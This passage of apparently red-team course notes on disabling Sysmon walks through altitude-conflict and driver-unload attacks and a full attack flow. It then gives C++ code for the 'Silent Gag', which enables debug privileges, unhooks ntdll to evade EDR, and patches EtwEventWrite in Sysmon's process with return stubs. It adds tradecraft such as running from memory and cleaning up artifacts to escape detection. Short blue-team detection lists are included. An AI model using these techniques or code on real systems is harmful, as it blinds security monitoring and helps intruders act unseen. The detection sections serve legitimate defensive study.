<img width="1233" height="647" alt="image" src="https://github.com/user-attachments/assets/1aa4a767-e10e-4cac-9ca6-782d6f510e17" />


Now our Sysmon has the same altitude as Bitdefender driver:

<img width="1226" height="643" alt="image" src="https://github.com/user-attachments/assets/f4a13be3-d238-4605-9c71-c437a73a2acc" />


Now, to make it effective, the machine has to be rebooted.


After reboot, let's check event viewer, and there is no Sysmon:

<img width="1235" height="627" alt="image" src="https://github.com/user-attachments/assets/6198ed70-a92f-4e7c-b227-5b9bf2537b7e" />


Let's check the logs, and we have another error. So again, DNS queries are still being logged because of the separate ETW provider. The error log is telling us that failed to access the driver that kills the kernel portion of Sysmon. So that's another way you can use to get rid of Sysmon:

<img width="1609" height="804" alt="image" src="https://github.com/user-attachments/assets/93e54f00-757d-48d1-9e0b-cdf0e6257f1f" />

 
#### Effects of Altitude Conflict
- Sysmon driver fails to load during system startup
- Kernel monitoring is completely disabled
- Leaves error logs in Event Viewer
- DNS events via ETW still work
- Requires system reboot to take effect

### Step 10: Compile and Execute

#### Building the Unload Tool
```cmd
cl implant.cpp
```

#### Execution
```cmd
implant.exe
```

And now the driver is gone:

<img width="1286" height="645" alt="image" src="https://github.com/user-attachments/assets/f5e3da85-879c-4db6-ac9d-de4ce73dc4ce" />


## Complete Attack Flow Example

1. **Discovery**: 
   - Run `reg query "HKLM\SYSTEM\CurrentControlSet\Services\ofltdrv\Parameters"` to extract:
     - Config file path (`C:\RTO\Tools\swift.xml`)
     - Driver name (`ofltdrv`)
     - Service information

2. **Analysis**: 
   - Open `C:\RTO\Tools\swift.xml` in editor to understand monitoring rules
   - Identify blind spots and exceptions in the configuration

3. **Configuration Attack**: 
   - Load permissive config with `onedrv.exe -c empty_rules.xml`

4. **Kernel Attack**: 
   - Unload driver with `implant.exe` or `fltmc unload ofltdrv`

5. **Persistence Attack**: 
   - Change altitude to cause permanent conflict after reboot

6. **Verification**:
   - Check `fltmc instances` for driver status
   - Monitor Event Viewer for error logs
  
     If we look at the Sysmon logs, now you can see that there is an error stating that, yeah, we couldn't retrieve events.

     <img width="1683" height="821" alt="image" src="https://github.com/user-attachments/assets/1ec47701-df4a-497b-83f2-8b7029b32d00" />

     But as you can see, there was something else logged. So unloading minifilter from the kernel doesn't stop logging done by the service. And particularly, DNS query events are being logged because Sysmon also uses ETW provider, which is Microsoft Windows DNS client. And these events are still being pushed to Sysmon service, and this lands in this log.


## Technical Details

### Critical Information from Registry Query
The command `reg query "HKLM\SYSTEM\CurrentControlSet\Services\ofltdrv\Parameters"` reveals:
- **ConfigFile**: Full path to active XML configuration
- **Rules**: REG_BINARY data of compiled filtering rules  
- **SysmonImagePath**: Location of Sysmon binary
- **Driver and service names** for manipulation

### Privilege Requirements

The SE_LOAD_DRIVER_NAME privilege is essential for unloading minifilter drivers. This privilege is not enabled by default in most processes, hence the need for the `SetPrivilege` function.

### Limitations and Considerations

1. **Partial Neutralization:** Driver unloading only affects kernel monitoring; ETW-based logging continues
2. **Log Evidence:** All techniques leave traces in Sysmon or system logs
3. **Reboot Requirements:** Altitude conflicts require system restart
4. **Service Persistence:** The Sysmon service continues running even after driver unloading
5. **ETW Persistence:** DNS and other ETW-based events continue to be captured

### Detection and Logging

Each technique produces different artifacts:

- **Configuration Changes:** Logged as configuration modification events
- **Driver Unloading:** Creates error events in Sysmon logs
- **Altitude Conflicts:** Generate driver load failure events
- **Service Manipulation:** May be detected by other security tools

## Defense Evasion Strategy

### For Red Teams
- Use multiple techniques in combination
- Time operations to minimize detection
- Clean up artifacts where possible
- Monitor for blue team responses

### For Blue Teams
- Monitor for altitude changes in registry
- Alert on driver unloading operations
- Watch for configuration file modifications
- Implement additional logging for service manipulation

## Reference

- [Microsoft Allocated Altitudes](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/allocated-altitudes)
- Matt Graeber and Lee Christensen's white paper on Sysmon configuration analysis
- SwiftOnSecurity Sysmon configuration for reference rulesets

</details>





<details>
<summary>08 - Dancing with Sysmon-Silent Gag</summary>
      
[03.Local-admin/03.Sysmon/04.SilentGag](https://github.com/Excalibra/RED-TEAM-OPERATOR-Evasion-Windows/tree/main/Files%20Windows%20Evasion/03.Local-admin/03.Sysmon/04.SilentGag)


A sophisticated technique to silently disable Sysmon logging without leaving traces in event logs or requiring system reboot.

## Overview

The Silent Gag technique provides a stealthy method to disable Sysmon monitoring by patching the `EtwEventWrite` function within the Sysmon process itself. Unlike previous methods that unload drivers or modify configurations, this approach leaves no error logs and is completely ephemeral - all changes are reversed when the service restarts.

## How Silent Gag Works

### Core Concept
Instead of attacking Sysmon's driver or configuration, we patch the `EtwEventWrite` function in the Sysmon service process memory. This function is responsible for writing all ETW (Event Tracing for Windows) events to the log. By patching it to simply return without doing anything, we effectively "gag" Sysmon without triggering any error conditions.

### Key Advantages
- **No Log Evidence**: Unlike driver unloading, this leaves no error events in Sysmon logs
- **No Reboot Required**: Changes take effect immediately
- **Ephemeral**: Service restart completely reverses the patch
- **Stealthy**: Sysmon appears to be running normally to monitoring systems

## Step-by-Step Implementation

### Step 1: Pre-Execution Verification

Before applying the gag, verify that Sysmon is actively logging:

```cmd
# Check if Sysmon driver is loaded
fltmc instances | findstr "Sysmon"

# Generate test events to verify logging
notepad.exe
nslookup google.com
ping twitter.com
```

Confirm these activities are being logged in Event Viewer under `Applications and Services Logs > Microsoft > Windows > Sysmon > Operational`.

### Step 2: Process Discovery

The code first locates the Sysmon process:

```cpp
int FindTarget(const char *procname) {
    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;
    
    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    // ... iterate through processes to find "onedrv.exe"
    return pid;
}
```

### Step 3: Privilege Escalation

Enable `SE_DEBUG_NAME` privilege to allow process memory manipulation:

```cpp
if (!SetPrivilege(SE_DEBUG_NAME, ENABLE))
    return -1;
```

### Step 4: Unhooking ntdll.dll (Anti-Detection)

The code includes sophisticated anti-detection measures:

```cpp
// Load clean copy of ntdll.dll from disk
hFile = CreateFile("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

// Create memory mapping
hFileMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
pMapping = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);

// Copy clean .text section over potentially hooked version
ret = UnhookNtdll(GetModuleHandle("ntdll.dll"), pMapping);
```

This prevents EDR hooks from detecting the memory patching activity.

### Step 5: Applying the Gag Patch

The core function that disables Sysmon logging:

```cpp
int GagSysmon(HANDLE hProc) {
    void * pEventWrite = GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");
    
#ifdef _WIN64
    // xor rax, rax; ret - immediately return 0 (success)
    char patch[] = "\x48\x33\xc0\xc3";
#else
    // xor eax, eax; ret 14 - immediately return 0 (success)  
    char patch[] = "\x33\xc0\xc2\x14\x00";
#endif

    WriteProcessMemory(hProc, pEventWrite, (PVOID) patch, sizeof(patch), NULL);
    FlushInstructionCache(hProc, pEventWrite, 4096);
    
    return 0;
}
```

**What the patch does:**
- Replaces `EtwEventWrite` function with minimal assembly that immediately returns 0 (success)
- This prevents any ETW events from being written to the log
- The function appears to succeed but no data is actually logged

### Step 6: Post-Execution Verification

After running the tool, verify that logging has stopped:

```cmd
# Generate test events that should no longer be logged
notepad.exe
nslookup sector7.net
ping google.com
```

Check Event Viewer - no new events should appear during the gag period.

## Building and Execution

### Compilation
```cmd
cl implant.cpp
```

### Execution
```cmd
implant.exe
```

**Expected Output:**
```
Killing Sysmon...done!
```

## Technical Details

### Assembly Patch Explanation

**x64 Patch:**
```asm
48 33 C0    xor rax, rax    ; Set return value to 0 (success)
C3          ret             ; Return immediately
```

**x86 Patch:**
```asm
33 C0       xor eax, eax    ; Set return value to 0 (success)  
C2 14 00    ret 14          ; Return and clean up stack
```

### Memory Protection Bypass

The code uses `WriteProcessMemory` which automatically handles memory protection changes. The `FlushInstructionCache` ensures the CPU uses the patched code.

### Ephemeral Nature

The patch is not persistent:
- **Service Restart**: `sc stop onedrv && sc start onedrv` completely reverses the patch
- **System Reboot**: All changes are lost after reboot
- **Manual Reversion**: The original function bytes are not preserved, but service restart fixes everything

## Detection and Monitoring

### What Blue Teams Should Look For

1. **Process Memory Modifications**: 
   - `WriteProcessMemory` calls targeting known security processes
   - Changes to `EtwEventWrite` function in process memory

2. **Privilege Usage**:
   - `SE_DEBUG_NAME` privilege being enabled
   - Process handle acquisition with `PROCESS_VM_WRITE` rights

3. **Behavioral Patterns**:
   - Sudden cessation of Sysmon logs from a specific host
   - Service stability without expected logging

### Defense Strategies

- **Memory Integrity Monitoring**: Detect modifications to critical functions in security processes
- **Privilege Auditing**: Alert on `SE_DEBUG_NAME` privilege escalation
- **Behavioral Analysis**: Correlate process manipulation with logging cessation
- **Service Monitoring**: Watch for unusual access patterns to Sysmon service

## Operational Considerations

### Advantages
- **Complete Log Suppression**: No process creation, network, or DNS events logged
- **No Service Disruption**: Sysmon service continues running normally
- **Quick Reversion**: Service restart completely removes the gag
- **Low Privilege Requirement**: Only requires local administrator rights

### Limitations
- **Temporary Effect**: Patch is lost on service restart or reboot
- **Process-Specific**: Only affects the patched Sysmon instance
- **Detection Risk**: Advanced EDR may detect the memory patching
- **x86/x64 Specific**: Requires different patches for different architectures

## Comparison with Other Techniques

| Technique | Persistence | Log Evidence | Reboot Required | Stealth Level |
|-----------|-------------|--------------|-----------------|---------------|
| Driver Unload | Until service restart | Error logs | No | Medium |
| Altitude Conflict | Permanent | Error logs | Yes | Low |
| Configuration Change | Permanent | Configuration change logs | No | Low |
| **Silent Gag** | **Until service restart** | **No evidence** | **No** | **High** |

## Recovery and Reversion

To restore normal Sysmon operation:

```cmd
# Simple service restart completely reverses the patch
sc stop onedrv
sc start onedrv
```

## Operational Security

- Run the tool from memory rather than disk to avoid process creation logs
- Time operations during periods of high system activity
- Consider combining with other techniques for layered defense evasion
- Monitor blue team responses to gauge detection

The Silent Gag technique represents a sophisticated approach to Sysmon neutralization that prioritizes stealth and minimal forensic footprint, making it ideal for red team operations where detection avoidance is critical.

      
</details>
